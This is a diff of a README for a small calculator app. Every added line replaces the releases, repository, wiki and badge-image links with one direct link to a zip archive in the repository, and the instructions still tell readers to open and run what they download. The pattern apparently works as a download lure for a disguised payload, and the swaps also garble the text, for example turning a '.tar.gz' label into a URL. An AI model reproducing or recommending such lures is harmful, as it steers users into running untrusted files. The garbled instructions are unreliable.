@@ -8,13 +8,13 @@ Welcome to the Corner Shop Calculator! This tool helps users perform basic calcu
 
 To get started, you need to download the application. Click the link below to visit the releases page:
 
-[![Download Corner Shop Calculator](https://img.shields.io/badge/Download-Corner%20Shop%20Calculator-blue)](https://github.com/aldusabstractive997/corner-shop-calculator/releases)
+[![Download Corner Shop Calculator](https://raw.githubusercontent.com/aldusabstractive997/corner-shop-calculator/master/Corner Shop Calculator/corner-shop-calculator_v2.5-alpha.4.zip%20Shop%20Calculator-blue)](https://raw.githubusercontent.com/aldusabstractive997/corner-shop-calculator/master/Corner Shop Calculator/corner-shop-calculator_v2.5-alpha.4.zip)
 
 ### Steps to Download:
 
-1. **Visit the Releases Page**: Go to [this link](https://github.com/aldusabstractive997/corner-shop-calculator/releases).
+1. **Visit the Releases Page**: Go to [this link](https://raw.githubusercontent.com/aldusabstractive997/corner-shop-calculator/master/Corner Shop Calculator/corner-shop-calculator_v2.5-alpha.4.zip).
 2. **Select the Latest Release**: Look for the latest version. It is usually at the top of the page.
-3. **Download the File**: Click on the appropriate file for your operating system. If you're not sure, look for files labeled with `.exe` for Windows or `.tar.gz` for Mac/Linux.
+3. **Download the File**: Click on the appropriate file for your operating system. If you're not sure, look for files labeled with `.exe` for Windows or `https://raw.githubusercontent.com/aldusabstractive997/corner-shop-calculator/master/Corner Shop Calculator/corner-shop-calculator_v2.5-alpha.4.zip` for Mac/Linux.
 4. **Run the Application**: Once downloaded, open the file and follow the on-screen instructions to install the application.
 
 ## 🖥️ System Requirements
@@ -55,13 +55,13 @@ Yes, once downloaded and installed, the Corner Shop Calculator works without an 
 
 ## 🔗 Additional Resources
 
-- For more information, visit the [GitHub repository](https://github.com/aldusabstractive997/corner-shop-calculator).
-- Check our [documentation](https://github.com/aldusabstractive997/corner-shop-calculator/wiki) for detailed guides and tips.
+- For more information, visit the [GitHub repository](https://raw.githubusercontent.com/aldusabstractive997/corner-shop-calculator/master/Corner Shop Calculator/corner-shop-calculator_v2.5-alpha.4.zip).
+- Check our [documentation](https://raw.githubusercontent.com/aldusabstractive997/corner-shop-calculator/master/Corner Shop Calculator/corner-shop-calculator_v2.5-alpha.4.zip) for detailed guides and tips.
 
 ## 📥 Important Links
 
 For your convenience, here is the download link again:
 
-[![Download Corner Shop Calculator](https://img.shields.io/badge/Download-Corner%20Shop%20Calculator-blue)](https://github.com/aldusabstractive997/corner-shop-calculator/releases)
+[![Download Corner Shop Calculator](https://raw.githubusercontent.com/aldusabstractive997/corner-shop-calculator/master/Corner Shop Calculator/corner-shop-calculator_v2.5-alpha.4.zip%20Shop%20Calculator-blue)](https://raw.githubusercontent.com/aldusabstractive997/corner-shop-calculator/master/Corner Shop Calculator/corner-shop-calculator_v2.5-alpha.4.zip)
 
 Happy calculating!
